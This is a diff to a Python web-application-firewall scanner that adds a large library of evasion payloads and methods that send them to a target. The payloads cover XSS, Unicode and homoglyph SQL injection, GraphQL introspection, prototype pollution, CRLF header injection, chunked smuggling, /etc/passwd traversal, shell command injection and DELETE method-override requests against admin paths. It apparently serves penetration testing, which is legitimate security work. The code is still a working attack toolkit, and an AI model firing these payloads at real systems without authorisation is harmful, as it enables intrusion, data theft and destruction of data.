@@ -8,6 +8,7 @@ Covers 2026 WAF techniques:
 - WAF-specific bypass methods
 """
 
+import asyncio
 import json
 import os
 import re
@@ -370,24 +371,70 @@ class WAFScanner:
             return None
 
     def test_bypasses(self) -> list[WAFFinding]:
-        """Test 2026 WAF bypass techniques."""
+        """Test 2026 WAF bypass techniques — comprehensive evasion library."""
         logger.info(f"Testing WAF bypass techniques on {self.target}")
 
         bypass_techniques = [
-            # ─── 2026 Bypass Techniques ─────────────────────────────
-            {"name": "unicode_normalization", "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e"},
-            {"name": "chunked_encoding", "payload": "Transfer-Encoding: chunked"},
-            {"name": "http2_smuggle", "payload": ":method: GET\r\n:path: /admin\r\n"},
-            {"name": "case_variation", "payload": "<ScRiPt>alert(1)</ScRiPt>"},
-            {"name": "double_encoding", "payload": "%253Cscript%253Ealert(1)%253C/script%253E"},
-            {"name": "null_bytes", "payload": "<scri%00pt>alert(1)</scri%00pt>"},
-            {"name": "mixed_case", "payload": "<sCrIpT>alert(1)</ScRiPt>"},
-            {"name": "html_comments", "payload": "<script<!-- -->alert(1)</script>"},
-            {"name": "mutation_xss", "payload": '<noscript><p title="</noscript><script>alert(1)</script>'},
-            {"name": "polyglot", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"},
-            {"name": "json_injection", "payload": '{"__proto__":{"polluted":true}}'},
-            {"name": "template_injection", "payload": "{{7*7}}${7*7}<%= 7*7 %>"},
-            {"name": "waf_fingerprint_leak", "payload": "GET /%00 HTTP/1.1\r\nHost: a"},
+            # ─── Classic XSS Variants ──────────────────────────────────────────
+            {"name": "case_variation", "category": "xss", "payload": "<ScRiPt>alert(1)</ScRiPt>"},
+            {"name": "double_encoding", "category": "xss", "payload": "%253Cscript%253Ealert(1)%253C%2Fscript%253E"},
+            {"name": "null_bytes", "category": "xss", "payload": "<scri\x00pt>alert(1)</scri\x00pt>"},
+            {"name": "html_comments", "category": "xss", "payload": "<script<!-- -->alert(1)</script>"},
+            {"name": "mutation_xss", "category": "xss", "payload": '<noscript><p title="</noscript><script>alert(1)</script>'},
+            {"name": "polyglot_xss", "category": "xss", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"},
+            {"name": "svg_xss", "category": "xss", "payload": "<svg/onload=alert(1)>"},
+            {"name": "img_onerror", "category": "xss", "payload": "<img src=x onerror=alert(1)>"},
+            {"name": "data_uri_xss", "category": "xss", "payload": "<a href=data:text/html,<script>alert(1)</script>>click</a>"},
+
+            # ─── Unicode / Homoglyph Normalization Bypass (2026) ──────────────
+            # Confusable Unicode chars that normalize to ASCII keywords
+            {"name": "unicode_select_bypass", "category": "sqli_unicode", "payload": "ꓴELECT * FROM users--"},
+            {"name": "unicode_union_bypass", "category": "sqli_unicode", "payload": "ᴜNION ꓢELECT 1,2,3--"},
+            {"name": "unicode_script_bypass", "category": "xss_unicode", "payload": "\uff53\uff43\uff52\uff49\uff50\uff54"},  # ｓｃｒｉｐｔ fullwidth
+            {"name": "homoglyph_or", "category": "sqli_unicode", "payload": "1 ᴼR 1=1--"},
+            {"name": "rtl_override", "category": "evasion", "payload": "\u202e<script>alert(1)</script>"},
+
+            # ─── GraphQL Aliasing Bypass (2026) ────────────────────────────────
+            # WAFs inspecting field names miss aliased equivalents
+            {"name": "graphql_alias_bypass", "category": "graphql", "payload": "{a:__typename b:__schema{queryType{name}}}"},
+            {"name": "graphql_fragment_bypass", "category": "graphql", "payload": "fragment x on Query{__typename} {... x}"},
+            {"name": "graphql_batch_bypass", "category": "graphql", "payload": '[{"query":"{__typename}"},{"query":"{__schema{queryType{name}}}"}]'},
+
+            # ─── JSON Homoglyph / Confusion Bypass (2026) ─────────────────────
+            {"name": "json_homoglyph_key", "category": "json_bypass", "payload": '{"ｓｅlect":"*","ｆｒｏｍ":"users"}'},
+            {"name": "json_proto_pollution", "category": "json_bypass", "payload": '{"__proto__":{"admin":true},"constructor":{"prototype":{"admin":true}}}'},
+            {"name": "json_crlf_injection", "category": "json_bypass", "payload": '{"x":"a\\r\\nSet-Cookie: admin=true"}'},
+            {"name": "json_unicode_escape", "category": "json_bypass", "payload": '{"\u0073elect":1}'},  # \u0073 = 's'
+
+            # ─── Chunked Transfer Bypass (2026) ────────────────────────────────
+            # WAFs that don't reassemble chunked bodies miss payloads
+            {"name": "chunked_split_payload", "category": "chunked", "payload": "Transfer-Encoding: chunked",
+             "body_chunks": ["<scr", "ipt>", "ale", "rt(1)</scr", "ipt>"]},
+
+            # ─── HTTP/2 Pseudo-Header Injection (2026) ────────────────────────
+            {"name": "h2_path_injection", "category": "h2_bypass", "payload": "/normal\x00/admin"},
+            {"name": "h2_header_fold", "category": "h2_bypass", "payload": "GET / HTTP/2\r\n:authority: target\r\n:path: /\x00/admin"},
+            {"name": "h2_method_override", "category": "h2_bypass", "payload": "X-HTTP-Method-Override: DELETE"},
+
+            # ─── SQLi Bypass ───────────────────────────────────────────────────
+            {"name": "sqli_comment_bypass", "category": "sqli", "payload": "1'/**/OR/**/1=1--"},
+            {"name": "sqli_inline_comment", "category": "sqli", "payload": "1' /*!50000OR*/ 1=1--"},
+            {"name": "sqli_url_encode", "category": "sqli", "payload": "1%27%20OR%20%271%27%3D%271"},
+            {"name": "sqli_double_url", "category": "sqli", "payload": "1%2527%2520OR%2520%25271%2527%253D%25271"},
+            {"name": "sqli_whitespace_alt", "category": "sqli", "payload": "1'%09OR%091=1--"},  # tab instead of space
+
+            # ─── Path Traversal Obfuscation ────────────────────────────────────
+            {"name": "path_traversal_encode", "category": "path", "payload": "..%2F..%2F..%2Fetc%2Fpasswd"},
+            {"name": "path_traversal_double", "category": "path", "payload": "....//....//etc/passwd"},
+            {"name": "path_traversal_unicode", "category": "path", "payload": "..%c0%af..%c0%afetc%c0%afpasswd"},
+
+            # ─── Template Injection ────────────────────────────────────────────
+            {"name": "ssti_polyglot", "category": "ssti", "payload": "${{<%[%'\"}}%\\"},
+            {"name": "ssti_math_probe", "category": "ssti", "payload": "{{7*7}}${7*7}<%= 7*7 %>"},
+
+            # ─── Header Injection ──────────────────────────────────────────────
+            {"name": "crlf_header_inject", "category": "header", "payload": "value\r\nX-Injected: evil"},
+            {"name": "host_header_evil", "category": "header", "payload": "evil.com"},
         ]
 
         bypass_findings = []
@@ -439,6 +486,381 @@ class WAFScanner:
 
         self.findings.extend(bypass_findings)
         return bypass_findings
+
+    def test_unicode_normalization_bypass(self) -> list[WAFFinding]:
+        """Test Unicode normalization and confusable character bypass.
+
+        WAFs that normalize Unicode to ASCII before filtering may miss
+        visually identical characters from different Unicode blocks.
+        """
+        logger.info(f"Testing Unicode normalization bypass on {self.target}")
+        findings: list[WAFFinding] = []
+
+        unicode_payloads = [
+            # Cyrillic small letter → ASCII 'a'
+            {"name": "cyrillic_a", "payload": "аdmin", "expected": "admin",
+             "description": "Cyrillic 'а' replaces Latin 'a'"},
+            # Mathematical sans-serif bold → ASCII 'alert'
+            {"name": "math_bold_alert", "payload": "𝐚𝐥𝐞𝐫𝐭(1)", "expected": "alert",
+             "description": "Mathematical bold symbols for XSS"},
+            # Fullwidth Latin → ASCII
+            {"name": "fullwidth_script", "payload": "＜ｓｃｒｉｐｔ＞", "expected": "script",
+             "description": "Fullwidth angle brackets + letters"},
+            # Devanagari normalization
+            {"name": "devanagari_union", "payload": "उनियन सेलेक्ट", "expected": "union select",
+             "description": "Devanagari script mimics SQL keywords"},
+            # Mixed confusables in path
+            {"name": "confusable_admin_path", "payload": "/\\u0430dmin/../etc/passwd",
+             "expected": "admin", "description": "Cyrillic 'а' in path traversal"},
+            # Thai Unicode confusables
+            {"name": "thai_select", "payload": "sеlect", "expected": "select",
+             "description": "Cyrillic 'е' in SELECT keyword"},
+        ]
+
+        for p in unicode_payloads:
+            try:
+                # Test in URL parameter
+                resp = self._send_request(f"{self.target}?q={p['payload']}")
+                reflected = p["payload"] in resp.text or p["expected"] in resp.text
+
+                # Test in POST body
+                resp_post = self._send_request(
+                    self.target, method="POST",
+                    data={"input": p["payload"]},
+                )
+                post_reflected = p["payload"] in resp_post.text
+
+                if reflected or post_reflected:
+                    finding = WAFFinding(
+                        waf_name="Unicode Normalization Bypass",
+                        detected=True,
+                        indicators=[p["name"]],
+                        bypass_techniques=["unicode_normalization"],
+                        severity="high",
+                        confidence="high",
+                        details=f"{p['description']}. Reflected in {'URL' if reflected else ''}"
+                                f"{' + POST' if post_reflected else ''}",
+                    )
+                    findings.append(finding)
+                    logger.warning(f"Unicode bypass found: {p['name']}")
+            except Exception as e:
+                logger.debug(f"Unicode bypass test failed: {e}")
+
+        self.findings.extend(findings)
+        return findings
+
+    def test_graphql_alias_bypass(self) -> list[WAFFinding]:
+        """Test GraphQL alias-based bypass techniques.
+
+        WAFs that only inspect the first field or operation name miss
+        aliased queries that smuggle malicious fields past the filter.
+        """
+        logger.info(f"Testing GraphQL alias bypass on {self.target}")
+        findings: list[WAFFinding] = []
+
+        graphql_endpoints = [
+            f"{self.target}/graphql",
+            f"{self.target}/api/graphql",
+            f"{self.target}/gql",
+            f"{self.target}/graphql/",
+        ]
+
+        alias_payloads = [
+            # Simple alias to extract schema
+            {
+                "name": "schema_extraction_alias",
+                "query": '{"a": "__typename", "b": "__schema { queryType { name } }"}',
+                "detect": ["queryType", "__schema"],
+            },
+            # Fragment spread with alias
+            {
+                "name": "fragment_alias_bypass",
+                "query": 'fragment x on Query { __typename } { a: x, b: x }',
+                "detect": ["__typename"],
+            },
+            # Batched aliased queries
+            {
+                "name": "batched_alias",
+                "query": '[{"query":"{a:__typename}","variables":{}},{"query":"{b:__schema{types{name}}}","variables":{}}]',
+                "detect": ["types", "__typename"],
+            },
+            # Deeply nested alias
+            {
+                "name": "nested_alias_introspection",
+                "query": '{"result": "__schema { types { name fields { name } } }"}',
+                "detect": ["types", "fields"],
+            },
+            # Mutation alias (leak via error message)
+            {
+                "name": "mutation_alias_error_leak",
+                "query": '{"q": "mutation { __typename }"}',
+                "detect": ["__typename", "mutation"],
+            },
+        ]
+
+        for endpoint in graphql_endpoints:
+            for payload in alias_payloads:
+                try:
+                    resp = self._send_request(
+                        endpoint,
+                        method="POST",
+                        headers={"Content-Type": "application/json"},
+                        content=payload["query"],
+                    )
+
+                    body = resp.text[:5000]
+                    detected_tokens = [d for d in payload["detect"] if d in body]
+
+                    if detected_tokens and resp.status_code != 404:
+                        finding = WAFFinding(
+                            waf_name="GraphQL Alias Bypass",
+                            detected=True,
+                            indicators=[payload["name"], f"tokens: {detected_tokens}"],
+                            bypass_techniques=["graphql_alias"],
+                            severity="high",
+                            confidence="high" if len(detected_tokens) >= 2 else "medium",
+                            details=f"Alias bypass on {endpoint} via {payload['name']}",
+                        )
+                        findings.append(finding)
+                        logger.warning(f"GraphQL alias bypass found: {payload['name']}")
+                except Exception as e:
+                    logger.debug(f"GraphQL alias test failed on {endpoint}: {e}")
+
+        self.findings.extend(findings)
+        return findings
+
+    def test_json_homoglyph_bypass(self) -> list[WAFFinding]:
+        """Test JSON homoglyph and encoding confusion bypass.
+
+        Attackers can use fullwidth characters, Unicode escapes, and
+        prototype pollution payloads that WAFs normalize incorrectly.
+        """
+        logger.info(f"Testing JSON homoglyph bypass on {self.target}")
+        findings: list[WAFFinding] = []
+
+        json_payloads = [
+            {
+                "name": "fullwidth_json_keys",
+                "payload": '{"ｓｅｌｅｃｔ":"*","ｆｒｏｍ":"users"}',
+                "detect": ["select", "from"],
+                "severity": "high",
+            },
+            {
+                "name": "unicode_escape_bypass",
+                "payload": '{"\\u0073elect":"*","\\u0066rom":"users"}',
+                "detect": ["select", "from"],
+                "severity": "high",
+            },
+            {
+                "name": "prototype_pollution",
+                "payload": '{"__proto__":{"admin":true},"constructor":{"prototype":{"role":"admin"}}}',
+                "detect": ["admin", "__proto__"],
+                "severity": "critical",
+            },
+            {
+                "name": "crlf_header_injection_json",
+                "payload": '{"name":"test\\r\\nSet-Cookie: session=admin"}',
+                "detect": ["Set-Cookie", "admin"],
+                "severity": "high",
+            },
+            {
+                "name": "json_double_parse",
+                "payload": '{"data":"{\\"nested\\":true,\\"admin\\":true}"}',
+                "detect": ["admin", "nested"],
+                "severity": "medium",
+            },
+            {
+                "name": "numeric_key_confusion",
+                "payload": '{"1":"admin","\\x31":"root"}',
+                "detect": ["admin", "root"],
+                "severity": "medium",
+            },
+        ]
+
+        for p in json_payloads:
+            try:
+                # Test as POST JSON body
+                resp = self._send_request(
+                    self.target,
+                    method="POST",
+                    headers={"Content-Type": "application/json"},
+                    content=p["payload"],
+                )
+                body = resp.text[:5000]
+                detected = [d for d in p["detect"] if d in body]
+
+                # Also test as query parameter (WAF may decode differently)
+                resp_param = self._send_request(
+                    f"{self.target}?data={p['payload']}",
+                )
+                param_detected = [d for d in p["detect"] if d in resp_param.text]
+
+                if detected or param_detected:
+                    finding = WAFFinding(
+                        waf_name="JSON Homoglyph Bypass",
+                        detected=True,
+                        indicators=[p["name"]],
+                        bypass_techniques=["json_homoglyph"],
+                        severity=p["severity"],
+                        confidence="high",
+                        details=f"{p['name']}: reflected in {'body' if detected else ''}"
+                                f"{' + query' if param_detected else ''}",
+                    )
+                    findings.append(finding)
+                    logger.warning(f"JSON homoglyph bypass found: {p['name']}")
+            except Exception as e:
+                logger.debug(f"JSON homoglyph test failed: {e}")
+
+        self.findings.extend(findings)
+        return findings
+
+    def test_chunked_transfer_bypass(self) -> list[WAFFinding]:
+        """Test chunked transfer encoding bypass.
+
+        WAFs that do not reassemble chunked request bodies miss payloads
+        split across multiple chunks. The Transfer-Encoding header is
+        sent separately from the body chunks.
+        """
+        logger.info(f"Testing chunked transfer bypass on {self.target}")
+        findings: list[WAFFinding] = []
+
+        chunked_payloads = [
+            {
+                "name": "xss_chunked",
+                "chunks": ["<scr", "ipt>", "ale", "rt(1)</scr", "ipt>"],
+                "assembled": "<script>alert(1)</script>",
+            },
+            {
+                "name": "sqli_chunked",
+                "chunks": ["1'", " OR ", "1", "=", "1--"],
+                "assembled": "1' OR 1=1--",
+            },
+            {
+                "name": "path_traversal_chunked",
+                "chunks": ["..", "/..", "/..", "/etc", "/passwd"],
+                "assembled": "../../etc/passwd",
+            },
+            {
+                "name": "ssti_chunked",
+                "chunks": ["{{7", "*7", "}}"],
+                "assembled": "{{7*7}}",
+            },
+            {
+                "name": "cmd_injection_chunked",
+                "chunks": [";", "cat", " ", "/etc/passwd"],
+                "assembled": ";cat /etc/passwd",
+            },
+        ]
+
+        for p in chunked_payloads:
+            try:
+                # Build chunked body manually
+                chunked_body = ""
+                for chunk in p["chunks"]:
+                    chunked_body += f"{len(chunk):x}\r\n{chunk}\r\n"
+                chunked_body += "0\r\n\r\n"
+
+                # Send raw chunked request
+                resp = self._send_request(
+                    self.target,
+                    method="POST",
+                    headers={
+                        "Transfer-Encoding": "chunked",
+                        "Content-Type": "text/plain",
+                    },
+                    content=chunked_body,
+                )
+
+                # Check if assembled payload is reflected
+                if p["assembled"] in resp.text:
+                    finding = WAFFinding(
+                        waf_name="Chunked Transfer Bypass",
+                        detected=True,
+                        indicators=[p["name"]],
+                        bypass_techniques=["chunked_transfer"],
+                        severity="high",
+                        confidence="high",
+                        details=f"Assembled chunked payload '{p['assembled']}' reflected",
+                    )
+                    findings.append(finding)
+                    logger.warning(f"Chunked bypass found: {p['name']}")
+            except Exception as e:
+                logger.debug(f"Chunked bypass test failed: {e}")
+
+        self.findings.extend(findings)
+        return findings
+
+    def test_h2_pseudo_header_bypass(self) -> list[WAFFinding]:
+        """Test HTTP/2 pseudo-header injection bypass.
+
+        HTTP/2 pseudo-headers (:method, :path, :authority) are not
+        visible to WAFs that only inspect standard headers. Null bytes,
+        header folding, and method override can bypass path-based rules.
+        """
+        logger.info(f"Testing HTTP/2 pseudo-header bypass on {self.target}")
+        findings: list[WAFFinding] = []
+
+        h2_payloads = [
+            {
+                "name": "null_path_injection",
+                "description": "Null byte in :path pseudo-header splits WAF path check",
+                "path": "/normal\x00/admin",
+                "detect_codes": [200, 301, 302],
+            },
+            {
+                "name": "path_normalization_mismatch",
+                "description": "Encoded vs decoded path confusion",
+                "path": "/%2e%2e/%2e%2e/admin",
+                "detect_codes": [200, 301, 302, 403],
+            },
+            {
+                "name": "double_path_slash",
+                "description": "Double slashes normalize differently in WAF vs backend",
+                "path": "//admin//",
+                "detect_codes": [200, 301, 302],
+            },
+            {
+                "name": "method_override_h2",
+                "description": "X-HTTP-Method-Override bypasses GET-only WAF rules",
+                "path": "/admin/delete",
+                "headers": {"X-HTTP-Method-Override": "DELETE"},
+                "detect_codes": [200, 204],
+            },
+            {
+                "name": "x_method_override",
+                "description": "X-HTTP-Method override variant",
+                "path": "/admin/users/1",
+                "headers": {"X-HTTP-Method": "DELETE"},
+                "detect_codes": [200, 204],
+            },
+        ]
+
+        for p in h2_payloads:
+            try:
+                url = f"{self.target}{p['path']}"
+                extra_headers = p.get("headers", {})
+                resp = self._send_request(url, headers=extra_headers)
+
+                if resp.status_code in p["detect_codes"]:
+                    # Compare with baseline (without manipulation)
+                    baseline_resp = self._send_request(f"{self.target}/normal")
+                    if resp.status_code != baseline_resp.status_code or resp.text != baseline_resp.text:
+                        finding = WAFFinding(
+                            waf_name="HTTP/2 Pseudo-Header Bypass",
+                            detected=True,
+                            indicators=[p["name"]],
+                            bypass_techniques=["h2_pseudo_header"],
+                            severity="high",
+                            confidence="medium",
+                            details=p["description"],
+                        )
+                        findings.append(finding)
+                        logger.warning(f"H2 pseudo-header bypass found: {p['name']}")
+            except Exception as e:
+                logger.debug(f"H2 pseudo-header test failed: {e}")
+
+        self.findings.extend(findings)
+        return findings
 
     def fingerprint_waf(self) -> dict:
         """Fingerprint WAF version and configuration."""
@@ -523,7 +945,23 @@ class WAFScanner:
         bypass_findings = self.test_bypasses()
         result.bypasses_found = len(bypass_findings)
 
-        # 5. Compile results
+        # 5. Dedicated bypass methods
+        unicode_bypasses = self.test_unicode_normalization_bypass()
+        result.bypasses_found += len(unicode_bypasses)
+
+        graphql_bypasses = self.test_graphql_alias_bypass()
+        result.bypasses_found += len(graphql_bypasses)
+
+        json_bypasses = self.test_json_homoglyph_bypass()
+        result.bypasses_found += len(json_bypasses)
+
+        chunked_bypasses = self.test_chunked_transfer_bypass()
+        result.bypasses_found += len(chunked_bypasses)
+
+        h2_bypasses = self.test_h2_pseudo_header_bypass()
+        result.bypasses_found += len(h2_bypasses)
+
+        # 6. Compile results
         result.findings = self.findings
         result.scan_duration = time.time() - start_time
 
